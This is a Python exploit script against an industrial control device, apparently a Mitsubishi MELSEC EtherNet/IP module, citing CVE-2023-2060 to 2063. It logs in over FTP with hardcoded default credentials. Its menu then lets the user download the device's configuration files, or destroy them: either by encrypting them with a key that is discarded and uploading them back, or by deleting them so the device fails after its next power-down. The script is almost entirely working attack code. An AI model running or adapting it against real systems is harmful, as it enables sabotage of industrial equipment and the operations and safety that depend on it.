#!/usr/bin/env python3 
# -*- coding: utf-8 -*- 
#Appicable vulnerabilities:
#CVE-2023-2060, CVE-2023-2061, CVE-2023-2062, CVE-2023-2063

from ftplib import FTP
import os
from cryptography.fernet import Fernet

#Define the FTP server's IPv4 address
ftp_server = input("Enter the IPv4 address of the device: ")

#Prompt user for selection
#Menu options
print("Select one of the following options:")
print("1. Download configuration file")
print("2. Encrypt configuration file")
print("3. Delete configuration file")
print("4. Verify vulnerability and exit")

choice = input("What would you like to do next? Choose from 1-4: ")

#Create an FTP connection
ftp = FTP(ftp_server)

#Authenticate the user
print("Logging in...")
try:
	ftp.login("MELSEC","RJ71EIP91")
	print("Target is vulnerable. You should upgrade this ICS device.")
except ftplib.all_errors as e:
	print(f'Error: {e}')
	if ftplib.error_perm:
		print("Login failed. Move on to next target. Nothing to see here.")


#Evaluate user choice
if choice == "1":
	ftp.retrbinary('RETR EipConfData.BIN', open('EipConfData.BIN', 'wb').write)
	ftp.retrbinary('RETR configuration.apa', open('configuration.apa', 'wb').write)
	print("The configuration file has been downloaded successfully!")

	#Close connection to the FTP server
	ftp.quit()

elif choice == "2":
	# Download configuration and backup files
	ftp.retrbinary('RETR EipConfData.BIN', open('EipConfData.BIN', 'wb').write)
	ftp.retrbinary('RETR configuration.apa', open('configuration.apa', 'wb').write)

	#Generate key
	key = Fernet.generate_key()
	fernet = Fernet(key)
	with open('ekey.key', 'wb') as k:
		k.write(key)

	#Encrypt configuration and backup files
	with open('EipConfData.BIN', 'rb') as eipconf:
		cfg = eipconf.read()
		encrypted_cfg = fernet.encrypt(cfg)

		#Override original file with the encrypted version
		with open('EipConfData.BIN', 'wb') as e:
			e.write(encrypted_cfg)

	with open('configuration.apa', 'rb') as backup:
		config = backup.read()
		encrypted_config = fernet.encrypt(config)
	
		#Override original file with the encrypted version
		with open('configuration.apa', 'wb') as c:
			c.write(encrypted_config)
	
		#Overwrite the encrypted version on the device
		ftp.storbinary('STOR EipConfData.BIN', open('EipConfData.BIN', 'rb'))
		ftp.storbinary('STOR configuration.apa', open('configuration.apa', 'rb')) 
		print("Encrypted configuration file uploaded to target. Exploit will activate after next power down of the device.")

		#Clean up
		os.remove('ekey.key')
		os.remove('EipConfData.BIN')
		os.remove('configuration.apa')
	
		#Close connection to the FTP server
		ftp.quit()

elif choice == "3":
	filename = "EipConfData.BIN"
	filename2 = "configuration.apa"
	ftp.delete(filename)
	ftp.delete(filename2)
	print("The configuration file has been deleted successfully! Exploit will activate after next power down of the device.")
	#Close connection to the FTP server
	ftp.quit()

elif choice == "4":
	ftp.quit()
